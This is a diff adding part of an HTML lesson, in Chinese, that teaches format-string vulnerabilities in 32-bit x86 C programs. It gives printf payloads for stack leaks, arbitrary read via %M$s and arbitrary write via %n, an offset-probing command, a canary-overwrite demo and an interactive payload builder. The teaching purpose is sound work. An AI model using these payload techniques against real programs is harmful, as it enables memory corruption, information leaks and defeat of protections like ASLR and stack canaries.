+            <p class="note"><b>观察任务：</b>把 <code>%s</code> 改成 <code>%n</code>，风险为什么直接跳满？再把 <code>%%</code> 放进去，它为什么是安全的？</p>
+          </div>
+        </div>
+
+        <div class="callout tip">
+          <div class="co-head"><span class="ico">✓</span>编译器能帮你抓</div>
+          <p><code>gcc -Wformat -Wformat-security -D_FORTIFY_SOURCE=2</code> 会对 <code>printf(user)</code> 这种“非字面量格式串”直接报警告；加上 <code>-Werror=format-security</code> 可以把它变成编译错误。这是最省钱的防御。</p>
+        </div>
+
+        <div class="recap">
+          <span class="rl">RECAP / 00</span>
+          <p><b>格式串是程序，参数是栈上的数据。</b>当程序和数据混在一起，用户就能借 printf 的口，读取甚至改写进程的内存。记住这句话，后面的栈布局、任意读、任意写都只是它的推论。</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 01 -->
+    <section class="section" id="s1">
+      <header class="sec-head reveal">
+        <div class="sec-ghost">01</div>
+        <div class="sec-eyebrow"><span class="sec-num">01</span><span class="sec-rule"></span><span class="sec-en">Execution</span></div>
+        <h2>printf 到底怎么干活</h2>
+        <p class="sec-lead">逐字符扫描，遇到 <code>%</code> 就取参数；扫完就结束，从不回头核对数量。理解了这台“取数机器”，所有说明符的行为都能推出来。</p>
+      </header>
+
+      <div class="prose">
+        <h3>1.1 主循环只有三件事<span class="h3-en">SCAN LOOP</span></h3>
+        <ol>
+          <li>读到普通字符（<code>N</code>、<code>u</code>、<code>m</code>…）→ 原样复制到输出缓冲区。</li>
+          <li>读到 <code>%</code> → 看后面的字母决定“这次要取一个什么类型的参数”，然后<strong>从当前参数指针位置取走 4 字节</strong>，参数指针往后挪一格。</li>
+          <li>格式串扫完 → 结束。<strong>它不会回头检查你到底给了几个参数。</strong></li>
+        </ol>
+
+        <div class="callout note">
+          <div class="co-head"><span class="ico">i</span>一句话记法</div>
+          <p><code>%</code> = 从栈上取 4 字节；后面的字母 = 把这 4 字节<strong>怎么解释</strong>；<code>n</code> 特殊——它不打印，而是<strong>写回</strong>。</p>
+        </div>
+
+        <h3>1.2 说明符速查<span class="h3-en">SPECIFIERS</span></h3>
+        <p>下表按“对栈做了什么”来记，比背语法更重要。风险列对应 0.5 的三级危害。</p>
+
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>写法</th><th>含义</th><th>从栈上取了什么</th><th class="risk">风险</th></tr></thead>
+            <tbody>
+              <tr><td><code>%d</code> / <code>%i</code></td><td>有符号十进制整数</td><td>4 字节，当整数打印</td><td class="risk"><span class="badge leak">LEAK</span></td></tr>
+              <tr><td><code>%u</code></td><td>无符号十进制</td><td>4 字节，当无符号整数打印</td><td class="risk"><span class="badge leak">LEAK</span></td></tr>
+              <tr><td><code>%x</code> / <code>%08x</code></td><td>十六进制（<code>08</code> = 不足 8 位左边补 0）</td><td>4 字节，按十六进制打印</td><td class="risk"><span class="badge leak">LEAK</span></td></tr>
+              <tr><td><code>%p</code></td><td>指针（十六进制）</td><td>4 字节，按指针格式打印</td><td class="risk"><span class="badge leak">LEAK</span></td></tr>
+              <tr><td><code>%c</code></td><td>字符</td><td>4 字节，<strong>只输出最低 1 字节</strong>对应的 ASCII 字符</td><td class="risk"><span class="badge leak">LEAK</span></td></tr>
+              <tr><td><code>%s</code></td><td>字符串</td><td>4 字节<strong>当地址</strong>，去那个地址读到 <code>\0</code> 为止</td><td class="risk"><span class="badge read">READ</span></td></tr>
+              <tr><td><code>%n</code></td><td><span style="color:var(--red)"><strong>不输出，反而写入</strong></span></td><td>4 字节<strong>当地址</strong>，把“已输出字符总数”写进去</td><td class="risk"><span class="badge write">WRITE</span></td></tr>
+              <tr><td><code>%10d</code></td><td>宽度 10</td><td>不够 10 位左边补空格；超过按实际位数</td><td class="risk"><span class="badge safe">—</span></td></tr>
+              <tr><td><code>%2$d</code></td><td>位置参数</td><td>直接取<strong>第 2 个</strong>参数（跳过中间的）</td><td class="risk"><span class="badge safe">—</span></td></tr>
+              <tr><td><code>%hn</code> / <code>%hhn</code></td><td>半字 / 单字节写入</td><td>写 2 字节 / 1 字节（实战常用，见第 6 节）</td><td class="risk"><span class="badge write">WRITE</span></td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <p>位置参数示例：<code>printf("%2$d", 10, 20, 30)</code> → 输出 <code>20</code>。它不改变“每个 <code>%</code> 都要从栈上取数”的本质，只是把“取第几个”写死了。</p>
+
+        <div class="callout warn">
+          <div class="co-head"><span class="ico">!</span>易错点</div>
+          <p>表格里有一行写错了会很危险：<code>%n</code> <strong>不产生输出</strong>。它不会在屏幕上留下痕迹，却会把数值写进内存。调试时如果你只盯着输出，很容易漏掉它。</p>
+        </div>
+
+        <div class="recap">
+          <span class="rl">RECAP / 01</span>
+          <p><b>printf 是一台只认格式串的取数机器。</b>普通字符直接复制；每遇到一个转换说明符，就从栈上取 4 字节，按字母解释。没有数量检查，也没有类型检查。</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 02 -->
+    <section class="section" id="s2">
+      <header class="sec-head reveal">
+        <div class="sec-ghost">02</div>
+        <div class="sec-eyebrow"><span class="sec-num">02</span><span class="sec-rule"></span><span class="sec-en">Stack Layout</span></div>
+        <h2>参数到底在栈的哪里</h2>
+        <p class="sec-lead">cdecl 从右往左压参数，<code>call</code> 再压返回地址。只要记住这个顺序，进 printf 时的栈布局就完全可预测——后面所有“第几个参数”的算术都从这里来。</p>
+      </header>
+
+      <div class="prose">
+        <p><strong>x86 32 位 + cdecl：</strong>参数从右往左依次 <code>push</code>，然后 <code>call</code> 把返回地址压进去。每个格子 4 字节，栈向低地址生长。下面这张图就是 <code>printf(fmt, i, a, &amp;a)</code> 进入 printf 后的样子。</p>
+
+        <div class="lab reveal" id="pushLab">
+          <div class="lab-head">
+            <span class="lab-title">LAB 01 / PUSH ORDER</span>
+            <span class="lab-sub">一步步压栈，看清“从右往左”到底长什么样</span>
+            <span class="lab-live"><i></i>INTERACTIVE</span>
+          </div>
+          <div class="lab-body">
+            <div class="task"><b>观察任务</b><span>先猜：最先压入的 <code>&amp;a</code>，最后在内存的哪个位置？点“压入下一个”验证你的直觉。</span></div>
+            <div class="split">
+              <div class="stack-view" id="pushStack"></div>
+              <div class="lab-side">
+                <p class="side-label">当前动作</p>
+                <div class="step-cap" id="pushStep">等待第 1 次 push…</div>
+                <div class="ctrl-row">
+                  <button class="btn sm" id="pushNext">压入下一个 →</button>
+                  <button class="btn ghost sm" id="pushAll">全部压入</button>
+                  <button class="btn ghost sm" id="pushReset">重置</button>
+                </div>
+                <p class="note" id="pushNote">栈从高地址向低地址生长；esp 始终指向当前栈顶。先压入的参数地址更高。</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <p>压栈结束后的顺序，从高地址到低地址是：<code>&amp;a</code> → <code>a</code> → <code>i</code> → <code>fmt</code> → <code>RET</code>。所以 <strong>参数 #1（i）紧挨着格式串</strong>，printf 的 <code>va_list</code> 就从 fmt 的下一个格子开始，一路往高地址走。</p>
+
+        <script type="text/plain" class="code-src" data-lang="asm" data-file="call-printf.s" data-lines="1">
+lea  edx, [ebp-0x8]   ; edx = &a
+push edx              ; ④ 第3个参数 &a 入栈
+mov  eax, [ebp-0x8]
+push eax              ; ③ 第2个参数 a 入栈
+push dword [ebp-0x4]  ; ② 第1个参数 i 入栈
+push 0x08048568       ; ① 格式串地址入栈
+call printf           ; 压入返回地址，进入 printf</script>
+
+        <div class="callout warn">
+          <div class="co-head"><span class="ico">!</span>课件里那个“？”</div>
+          <p><strong><code>0xbfffebe8</code> 为什么不等于 <code>0xbfffebf4</code>？</strong></p>
+          <p>这俩是两码事：<code>0xbfffebf4</code> 是 main 里局部变量 <code>a</code> 的真实地址（也就是 <code>&amp;a</code> 这个<strong>值</strong>）；<code>0xbfffebe8</code> 是 printf 参数区里“存放 &amp;a 这一格”的<strong>地址</strong>。</p>
+          <p>你在 gdb 里 <code>x/wx 0xbfffebe8</code>，看到的内容正是 <code>0xbfffebf4</code>。就像<strong>“抽屉的编号”</strong>和<strong>“抽屉里放的钥匙”</strong>不是一回事。</p>
+        </div>
+
+        <div class="callout tip">
+          <div class="co-head"><span class="ico">i</span>读栈图的三件事</div>
+          <p><strong>① 高地址在上，低地址在下。</strong>栈向低地址生长，push 会让 esp 往下走。<br>
+          <strong>② 每格 4 字节。</strong>32 位下一个参数 / 一个地址都占一格。<br>
+          <strong>③ 参数 #1 离格式串最近。</strong>从 fmt 往下数（往高地址走），依次是 #1、#2、#3……</p>
+        </div>
+
+        <div class="recap">
+          <span class="rl">RECAP / 02</span>
+          <p><b>栈的顺序是确定的，所以“第 5 个参数”可以精确指到某一格。</b>格式串里的地址如果能落在第 M 格，<code>%M$s</code> 和 <code>%M$n</code> 就能精确使用它。问题只剩：怎么把地址放上去。</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 03 -->
+    <section class="section" id="s3">
+      <header class="sec-head reveal">
+        <div class="sec-ghost">03</div>
+        <div class="sec-eyebrow"><span class="sec-num">03</span><span class="sec-rule"></span><span class="sec-en">Leak</span></div>
+        <h2>参数没给够，printf 去哪儿拿？</h2>
+        <p class="sec-lead">它不会报错，只会顺着栈继续往上取——取出上一个函数的局部变量、保存的寄存器、某个指针，甚至格式串本身的字节。这就是信息泄露的起点。</p>
+      </header>
+
+      <div class="prose">
+        <div class="task" style="margin:0 0 14px"><b>先猜再验证</b><span>格式串是 <code>%d %d %d %d</code>，实际只传了 <code>10, 20</code>。第三个 <code>%d</code> 会打印什么？先想 10 秒，再往下点。</span></div>
+
+        <div class="lab reveal" id="sim">
+          <div class="lab-head">
+            <span class="lab-title">LAB 02 / PRINTF SIMULATOR</span>
+            <span class="lab-sub">单步观察 ap 如何移动，以及“没有参数”的格子会被怎样使用</span>
+            <span class="lab-live"><i></i>INTERACTIVE</span>
+          </div>
+          <div class="lab-body">
+            <div class="presets">
+              <button class="preset" data-fmt="%d %d %d %d" data-args="10, 20">只传 2 个</button>
+              <button class="preset" data-fmt="%08x.%08x.%08x.%08x" data-args="">泄露栈</button>
+              <button class="preset" data-fmt="%s%s%s" data-args="">触发崩溃</button>
+              <button class="preset" data-fmt="%d %d %s" data-args="10, 20">第三个读字符串</button>
+            </div>
+            <div class="field-row">
+              <label class="field grow"><span>格式串</span><input id="simFmt" type="text" value="%d %d %d %d" spellcheck="false" autocomplete="off" aria-label="模拟格式串"></label>
+              <label class="field w110"><span>实际参数</span><input id="simArgs" type="text" value="10, 20" spellcheck="false" autocomplete="off" aria-label="实际传入参数"></label>
+            </div>
+            <div class="split">
+              <div>
+                <p class="side-label">栈视图 · 高地址在上</p>
+                <div class="stack-view" id="simStack"></div>
+              </div>
+              <div class="lab-side">
+                <div class="scan-box">
+                  <div class="sc-label"><span>FORMAT SCAN</span><span id="simTokenInfo">—</span></div>
+                  <div class="scan-line" id="simScan"></div>
+                </div>
+                <div class="sim-meta"><span>ap = <b id="simAp">#1</b></span><span>已输出 <b id="simCount">0</b> 字符</span></div>
+                <div class="sim-out" id="simOut">printf 的输出会出现在这里。</div>
+                <p class="note" id="simNote">点“单步”，观察每次转换说明符如何移动 ap。</p>
+                <div class="ctrl-row">
+                  <button class="btn sm" id="simStepBtn">单步 ▶</button>
+                  <button class="btn ghost sm" id="simAutoBtn">自动播放</button>
+                  <button class="btn ghost sm" id="simResetBtn">重置</button>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="lab-foot">
+            <p class="note"><b>演示约定：</b>未映射的地址统一视为不可读；真实进程是否崩溃，取决于该地址是否合法。这里要理解的是“取数不受数量约束”这个机制。</p>
+          </div>
+        </div>
+
+        <h3>3.1 所以 <code>%08x.%08x.%08x.%08x</code> 输出了什么？<span class="h3-en">READ THE OUTPUT</span></h3>
+        <p>输出的<strong>不是</strong>字面量，而是栈上 4 个格子里的值，每个按 8 位十六进制补零打印，例如：</p>
+        <div class="term-out">
+          <div class="win-bar"><span class="win-dots"><i></i><i></i><i></i></span><span class="win-file">leak</span><span class="win-lang">OUTPUT</span></div>
+          <pre><span class="t-warn">bfffebf4.0000000a.00000005.08048568</span>
+
+<span class="t-dim">↑ 栈上残留的指针    ↑ 局部变量 a     ↑ 局部变量 i     ↑ 代码段地址</span></pre>
+        </div>
+        <p>这些值看起来像“随机数”，其实是程序运行时真实的内存布局。攻击者拿到它们，就能推算 libc 基址、栈地址、canary 等关键信息。</p>
+
+        <h3>3.2 为什么格式串本身也会被读到？<span class="h3-en">SELF-READ</span></h3>
+        <p>格式串在内存里就是一串字节，而且它本身也躺在栈上的某个缓冲区里。字符和字节的对应关系是：</p>
+        <div class="grid4">
+          <div class="card"><h4><code>%</code></h4><p>0x25</p></div>
+          <div class="card"><h4><code>0</code></h4><p>0x30</p></div>
+          <div class="card"><h4><code>8</code></h4><p>0x38</p></div>
+          <div class="card"><h4><code>x</code></h4><p>0x78</p></div>
+        </div>
+        <p>所以当 <code>ap</code> 走到的格子恰好覆盖格式串缓冲区时，printf 会把这些字节当成“数据”打印出来。这听起来只是好玩，但它意味着：<strong>攻击者写进格式串的地址字节，也会实实在在落在栈上。</strong>下一节的任意读，就靠这个。</p>
+
+        <div class="callout danger">
+          <div class="co-head"><span class="ico">!</span>为什么“只泄露一点”也很危险</div>
+          <p>ASLR 的作用是让地址不可预测。但一次格式化字符串泄露，就能把栈地址、代码地址、甚至 canary 原样交出来。有了这些，<strong>Canary、ASLR 的防护会被逐个拆掉</strong>。信息泄露不是“轻微问题”，而是后续利用的钥匙。</p>
+        </div>
+
+        <div class="recap">
+          <span class="rl">RECAP / 03</span>
+          <p><b>printf 不检查“还有没有参数”。</b>格式串要几个，它就取几个；没有参数的地方，取到的就是栈上别人的数据。这就是静默的信息泄露。</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 04 -->
+    <section class="section" id="s4">
+      <header class="sec-head reveal">
+        <div class="sec-ghost">04</div>
+        <div class="sec-eyebrow"><span class="sec-num">04</span><span class="sec-rule"></span><span class="sec-en">Arbitrary Read</span></div>
+        <h2>任意读：把地址塞进格式串</h2>
+        <p class="sec-lead">攻击者控制不了参数，但能控制格式串本身——而格式串就在栈上。只要把目标地址作为 4 个字节写进格式串，再用 <code>%s</code> 指过去，就能读取任意可读内存。</p>
+      </header>
+
+      <div class="prose">
+        <h3>4.1 任意读需要凑齐两件事<span class="h3-en">TWO INGREDIENTS</span></h3>
+        <div class="grid2">
+          <div class="card cyan">
+            <span class="tag">① 说明符</span>
+            <h4><code>%s</code>：把参数当地址</h4>
+            <p>从栈上取 4 字节，把<strong>这个值当地址</strong>，去那个地址读字符串，直到遇到 <code>\0</code>。</p>
+          </div>
+          <div class="card acid">
+            <span class="tag">② 地址上栈</span>
+            <h4>把地址写进格式串</h4>
+            <p>格式串（缓冲区）本身就在栈上。把 4 个地址字节写进字符串，就等于把一个 4 字节值放到了栈上。</p>
+          </div>
+        </div>
+        <p>剩下的问题只有一个：<strong>怎么让参数指针正好停在这 4 个字节上？</strong> 两种做法——数格子，或者用位置参数直接点格。</p>
+
+        <h3>4.2 做法一：用 <code>%08x</code> 空转<span class="h3-en">WALK THE STACK</span></h3>
+        <script type="text/plain" class="code-src" data-lang="c" data-file="read.c" data-lines="1">
+printf("\x1f\x01\xff\xbf_%08x.%08x|%s|");
+/*      └── 目标地址 ──┘ ↑        ↑        ↑
+                        填充     空转2格   到站，读！ */</script>
+
+        <div class="sketch"><span class="cy">格式串内容</span>   \x1f \x01 \xff \xbf   _   %08x  .  %08x  |  %s  |
+<span class="cy">栈上效果</span>      [ 0xbfff011f ]        [参数1]   [参数2]  [参数3 = 地址]
+                                     <span class="c">└──── 空转 2 格，让 ap 走到第 3 格 ────┘</span></div>
+
+        <div class="callout warn">
+          <div class="co-head"><span class="ico">!</span>那个 <code>_</code> 是干嘛的？</div>
+          <p>地址占 4 字节，栈按 4 字节对齐读。补 1 个填充字符，让这 4 字节地址正好落在某一格的开头，<code>%s</code> 才会精准取到它。<strong>不对齐，读到的地址就歪了。</strong></p>
+          <p>空转几格不是算出来的，通常先用 <code>AAAA%p|%p|…</code> 探出偏移，再固定 payload。</p>
+        </div>
+
+        <h3>4.3 做法二：位置参数 <code>%M$s</code><span class="h3-en">POSITIONAL</span></h3>
+        <p>不用数 <code>%08x</code> 的个数，直接说“我要第 M 个参数”：</p>
+        <script type="text/plain" class="code-src" data-lang="c" data-file="read2.c" data-lines="1">
+printf("\xaa\xbb\xcc\xdd%3$s");
+/*      └── 地址 ──┘ └ 取第 3 个参数当地址，打印它指向的字符串 */</script>
+
+        <div class="sketch">栈（从参数 #1 开始往上数）：
+[ RET ][ fmt ][ a1 ][ a2 ][ <span class="cy">\xaa\xbb\xcc\xdd%3$s</span> ]
+                 (1)   (2)   (3)  <span class="c">← 格式串缓冲区正好落在第 3 格</span>
+
+<span class="am">%3$s</span> → 取第 3 格的 0xddccbbaa 当地址 → 打印该地址处的字符串</div>
+
+        <div class="callout fix">
+          <div class="co-head"><span class="ico">✓</span>一句话记法</div>
+          <p><code>%M$s</code> = “把我塞进去的第 M 个 4 字节当地址，把那里的字符串打出来”。位置参数只是“移动参数指针”的语法糖，本质和用 <code>%08x</code> 空转完全一样。</p>
+        </div>
+
+        <h3>4.4 偏移 M 是试出来的，不是算出来的<span class="h3-en">FIND THE OFFSET</span></h3>
+        <p>格式串缓冲区落在第几格，取决于编译器、栈布局、函数调用链。换台机器可能就变了。标准做法是先用 <code>AAAA</code> 打标，看哪一格输出 <code>0x41414141</code>：</p>
+        <div class="term-out">
+          <div class="win-bar"><span class="win-dots"><i></i><i></i><i></i></span><span class="win-file">probe-offset</span><span class="win-lang">BASH</span></div>
+          <pre><span class="t-p">$</span> echo -e "\x41\x41\x41\x41%p|%p|%p|%p|%p|%p|%p|%p" | ./target
+0x...|0x...|0x...|0x...|<span class="t-ok">0x41414141</span>|0x...|0x...
+<span class="t-dim"># 第 5 格出现 0x41414141 → 以后就用 %5$s / %5$n</span></pre>
+        </div>
+        <p>这个“探偏移”的动作会在第 12 节的主实验里完整走一遍。</p>
+
+        <h3>4.5 真实案例：读走 <code>Invalid Password!!!</code><span class="h3-en">CASE</span></h3>
+        <p>课件里的 payload 是 <code>printf("\x1f\x01\xff\xbf_%08x.%08x.%08x.%08x.%08x|%s|")</code>，最终打印出了内存里的敏感字符串 <code>"Invalid Password!!!"</code>。注意课件特意标了 <code>I n v a</code> → <code>49 6e 76 61</code>，而实际读成 32 位值时顺序是反的——这是 <strong>x86 小端序</strong>。</p>
+        <p>下面这个小教具帮你把“字符顺序”和“小端数值”对上号。改一改输入，观察字节和 dword 的联动：</p>
+
+        <div class="lab reveal" id="endianLab">
+          <div class="lab-head">
+            <span class="lab-title">LAB 03 / LITTLE ENDIAN</span>
+            <span class="lab-sub">内存按字节顺序增长，x86 读成 32 位值时低字节在前</span>
+            <span class="lab-live"><i></i>LIVE</span>
+          </div>
+          <div class="lab-body">
+            <div class="split even">
+              <div>
+                <div class="field-row">
+                  <label class="field w110"><span>4 个字符</span><input id="endianIn" type="text" value="Inva" maxlength="4" spellcheck="false" autocomplete="off" aria-label="输入四个字符"></label>
+                </div>
+                <div class="endian-out">
+                  <div class="e-row"><span class="ek">内存字节（低→高）</span><div id="endianBytes"></div></div>
+                  <div class="e-row"><span class="ek">按小端读成 dword</span><span class="e-dword" id="endianDword">0x61766e49</span></div>
+                </div>
+                <p class="note" id="endianNote">字符按顺序写进内存；x86 把最低地址的字节当成整数的最低字节。</p>
+              </div>
+              <div>
+                <p class="side-label">为什么写 payload 时地址字节是反的？</p>
+                <p style="font-size:12.5px;line-height:1.85;color:var(--ink2);margin:0">假设目标地址是 <code>0xbfffec88</code>。在字符串里必须依次写 <code>\x88\xec\xff\xbf</code>——<strong>最低字节写在最前面</strong>。这 4 个字节落在栈上后，printf 按小端读出，才等于 <code>0xbfffec88</code>。</p>
+                <div class="sketch" style="margin-top:10px"><span class="c">目标值</span>  0x<span class="am">bf</span><span class="cy">ff</span><span class="r">ec</span>88
+<span class="c">字符串</span>  \x88 \xec \xff \xbf
+           <span class="c">└────── 低地址到高地址 ──────┘</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="callout note">
+          <div class="co-head"><span class="ico">→</span>下一步</div>
+          <p><code>%s</code> 已经能读任意可读内存了。把最后一个字母从 <code>s</code> 改成 <code>n</code>，<code>%3$s</code> 就变成 <code>%3$n</code>——从“读”变成“写”。<strong>任意读和任意写，只差一个字母。</strong></p>
+        </div>
+
+        <div class="recap">
+          <span class="rl">RECAP / 04</span>
+          <p><b>地址放进格式串，再用 <code>%M$s</code> 指过去。</b>M 是试出来的；地址字节按小端序写。任意读的本质，是利用“格式串缓冲区本身就在栈上”这个事实。</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 05 -->
+    <section class="section" id="s5">
+      <header class="sec-head reveal">
+        <div class="sec-ghost">05</div>
+        <div class="sec-eyebrow"><span class="sec-num">05</span><span class="sec-rule"></span><span class="sec-en">Arbitrary Write</span></div>
+        <h2>核心难点：%n 不是打印，是写入</h2>
+        <p class="sec-lead"><code>%n</code> 不产生任何输出。它把“到此处为止，printf 已经输出了多少字符”写进参数指向的地址——32 位下写满 4 个字节。</p>
+      </header>
+
+      <div class="prose">
+        <div class="callout danger reveal">
+          <div class="co-head"><span class="ico">!</span>Definition</div>
+          <p><code>%n</code> 的行为：<strong>取 4 字节当地址，把“已输出字符数”写进那个地址</strong>。32 位下一次写 4 字节；<code>%hn</code> 写 2 字节；<code>%hhn</code> 写 1 字节。</p>
+          <p>它最常见的“正常用途”是统计长度，但在漏洞里，它是最直接的<strong>任意地址写</strong>原语。</p>
+        </div>
+
+        <script type="text/plain" class="code-src" data-lang="c" data-file="n-basic.c" data-lines="1">
+int len = 0;
+printf("1234%n", &len);
+/* 屏幕输出 "1234"，同时 len = 4 */</script>
+
+        <h3>5.1 课件里的 canary 例子：一次写 4 字节的代价<span class="h3-en">OVERWRITE</span></h3>
+        <p>先看一个“看起来只写 1 字节”的误解。下面代码想把 4 个值分别写进 <code>foo[0..3]</code>，结果却把紧邻的 canary 踩坏了：</p>
+
+        <script type="text/plain" class="code-src" data-lang="c" data-file="write.c" data-lines="1">
+unsigned char canary[5];
+unsigned char foo[4];
+memset(foo, '\x00', sizeof(foo));
+strcpy(canary, "AAAA");
+
+printf("%16u%n",  7350, (int *)&foo[0]);  /* 已输出 16  → 写 0x10 00 00 00 */
+printf("%32u%n",  7350, (int *)&foo[1]);  /* 已输出 32  → 写 0x20 00 00 00 */
+printf("%64u%n",  7350, (int *)&foo[2]);  /* 已输出 64  → 写 0x40 00 00 00 */
+printf("%128u%n", 7350, (int *)&foo[3]);  /* 已输出 128 → 写 0x80 00 00 00 */
+
+printf("foo:    %02x%02x%02x%02x\n", foo[0], foo[1], foo[2], foo[3]);
+printf("canary: %02x%02x%02x%02x\n", canary[0], canary[1], canary[2], canary[3]);</script>
+
+        <div class="term-out">
+          <div class="win-bar"><span class="win-dots"><i></i><i></i><i></i></span><span class="win-file">write</span><span class="win-lang">OUTPUT</span></div>
+          <pre>foo:    <span class="t-ok">10204080</span>
+canary: <span class="t-bad">00000041</span>   <span class="t-dim">← 原来应该是 41 41 41 41</span></pre>
+        </div>
+
+        <div class="lab reveal" id="canaryLab">
+          <div class="lab-head">
+            <span class="lab-title">LAB 04 / FOUR-BYTE WRITE</span>
+            <span class="lab-sub">一步步执行四条 %n，观察越界写从哪里开始</span>
+            <span class="lab-live"><i></i>INTERACTIVE</span>
+          </div>
+          <div class="lab-body">
+            <div class="task"><b>观察任务</b><span>哪一步第一次踩到 canary？写进去的是“一个字节”还是“四个字节”？</span></div>
+            <div class="split">
+              <div>
+                <p class="side-label">内存布局 · foo[4] 紧邻 canary[5]</p>
+                <div class="byte-scroll"><div class="byte-strip" id="canaryBytes"></div></div>
+                <div class="readout">
+                  <span class="rk">foo</span><span class="rv foo" id="canaryFoo">00 00 00 00</span>
+                  <span class="rk">canary</span><span class="rv can" id="canaryCan">41 41 41 41 00</span>
+                </div>
+                <p class="note" style="margin-top:0">canary 的 5 个字节：<code>41 41 41 41 00</code>（"AAAA" + 结尾 0）。程序只打印前 4 个。</p>
+              </div>
+              <div class="lab-side">
+                <p class="side-label">当前写入</p>
+                <div class="step-cap" id="canaryStep">等待第 1 次写入…</div>
+                <div class="ctrl-row">
+                  <button class="btn sm" id="canaryNext">执行下一条 →</button>
+                  <button class="btn ghost sm" id="canaryAll">全部执行</button>
+                  <button class="btn ghost sm" id="canaryReset">重置</button>
+                </div>
+                <p class="note" id="canaryNote">每条 <code>printf("%Nu%n", ..., &amp;foo[k])</code> 都从 <code>foo[k]</code> 开始写 4 字节，而不是 1 字节。</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="callout warn">
+          <div class="co-head"><span class="ico">!</span>为什么 canary 变成 <code>00000041</code>？</div>
+          <p>因为 <code>canary</code> 紧跟在 <code>foo</code> 后面（<code>foo[4]</code> 后面就是 <code>canary[0]</code>）。<strong><code>%n</code> 是一次写 4 字节的，不是 1 个字节！</strong></p>
+          <p>最后一句 <code>printf("%128u%n", &amp;foo[3])</code> 从 <code>foo[3]</code> 开始写 <code>0x80 00 00 00</code>（小端）：<code>foo[3]</code> 被写成 <code>0x80</code>，紧接着的 3 个零字节<strong>顺手踩掉了 canary[0..2]</strong>。原来 <code>41 41 41 41 00</code> 只剩下 <code>canary[3] = 41</code>，所以打印成 <code>00 00 00 41</code>。</p>
+          <p>这就是“格式化字符串能越界写”的直观证据。</p>
+        </div>
+
+        <h3>5.2 把 <code>%n</code> 用到攻击上：任意地址写<span class="h3-en">TO ARBITRARY WRITE</span></h3>
+        <script type="text/plain" class="code-src" data-lang="c" data-file="write2.c" data-lines="1">
+printf("\xaa\xbb\xcc\xdd%3$n");
+/*      └── 目标地址 ──┘ └ 把“已输出字符数”写进这个地址 */</script>
+
+        <div class="sketch">[ RET ][ fmt ][ a1 ][ a2 ][ <span class="cy">\xaa\xbb\xcc\xdd%3$n</span> ]
+                 (1)   (2)   (3)
+        <span class="c">└──────────────────────┘</span>
+        <span class="am">%3$n</span> → 取第 3 格的 0xddccbbaa 当地址
+        → 往 0xddccbbaa 写入“当前已输出字符数” = <b>4</b></div>
+
+        <p>这里的“已输出字符数”就是前面那 4 个地址字节本身，所以效果是 <code>*(int*)0xddccbbaa = 4</code>。</p>
+
+        <div class="callout note">
+          <div class="co-head"><span class="ico">→</span>读和写只差一个字母</div>
+          <p><code>%3$s</code> 改成 <code>%3$n</code>。读和写用的是<strong>同一套“地址塞进格式串 + 移动参数指针”的套路</strong>，区别只在最后一个说明符是“读”还是“写”。</p>
+        </div>
+
+        <div class="recap">
+          <span class="rl">RECAP / 05</span>
+          <p><b><code>%n</code> 一次写 4 字节。</b>它把“已输出字符数”写进参数指向的地址。地址来自栈，数量由输出长度控制——所以既能任意写，也能写坏紧邻的内存。</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 06 -->
+    <section class="section" id="s6">
+      <header class="sec-head reveal">
+        <div class="sec-ghost">06</div>
+        <div class="sec-eyebrow"><span class="sec-num">06</span><span class="sec-rule"></span><span class="sec-en">Value Control</span></div>
+        <h2>写任意数值：用宽度当杠杆</h2>
+        <p class="sec-lead">能写还不够，还要能写指定的值。杠杆是宽度修饰符：地址占 4 个字符，<code>%nc</code> 再补 n−1 个，写入值就是 <code>4 + n</code>。</p>
+      </header>
+
+      <div class="prose">
+        <script type="text/plain" class="code-src" data-lang="c" data-file="value.c" data-lines="1">
+printf("\xaa\xbb\xcc\xdd%6c%3$n");
+/*      └── 地址 4 字节 ──┘ ↑     └ 写入此时已输出的字符数
+                         宽度 6：输出一个占 6 字符宽的东西 */</script>
+
+        <div class="sketch"><span class="cy">已输出</span> = 4（地址字节） + 6（%6c 的宽度） = <b>10</b>
+<span class="cy">效果</span>   = *(int *)0xddccbbaa = 10</div>
+
+        <div class="callout fix">
+          <div class="co-head"><span class="ico">✓</span>通用公式</div>
+          <p><strong>写入的值 = 地址占的 4 字节 + <code>%nc</code> 里的 n</strong>，即 <code>n = 目标值 − 4</code>。如果有前缀（例如程序自动拼上的提示语），还要减去前缀长度。</p>
+        </div>
+
+        <div class="lab reveal" id="payloadLab">
+          <div class="lab-head">
+            <span class="lab-title">LAB 05 / PAYLOAD BUILDER</span>
+            <span class="lab-sub">改数值、改偏移，观察 payload 与 n 的联动</span>
+            <span class="lab-live"><i></i>LIVE</span>
+          </div>
+          <div class="lab-body">
+            <div class="task"><b>观察任务</b><span>把写入值从 <code>0x41</code> 改成 <code>0x42</code>，n 怎么变？再切换 <code>%hn</code>，想想为什么小数值反而写不了。</span></div>
+            <div class="field-row">
+              <label class="field w110"><span>目标地址（hex）</span><input id="payAddr" type="text" value="0xbfffec88" spellcheck="false" autocomplete="off"></label>
+              <label class="field w110"><span>写入值（hex）</span><input id="payVal" type="text" value="0x41" spellcheck="false" autocomplete="off"></label>
+              <label class="field w70"><span>参数位置 M</span><input id="payM" type="number" value="5" min="1" max="20"></label>
+              <label class="field w70"><span>前缀长度</span><input id="payPrefix" type="number" value="0" min="0" max="999"></label>
+              <div class="field"><span>写入宽度</span><div class="seg" id="payMode"><button data-mode="n" class="on">%n · 4B</button><button data-mode="hn">%hn · 2×2B</button></div></div>
+            </div>
+            <div class="pay-line"><span class="sig">payload</span><span id="payString">—</span></div>
+            <div class="pay-stats">
+              <div class="pay-stat"><span>LE 字节</span><b id="payBytes">—</b></div>
+              <div class="pay-stat"><span>需要补的宽度</span><b id="payN">—</b></div>
+              <div class="pay-stat"><span>总输出字符</span><b id="payTotal">—</b></div>
+              <div class="pay-stat wide"><span>说明</span><b id="payNote" style="font-weight:400;color:var(--ink3)">—</b></div>
+            </div>
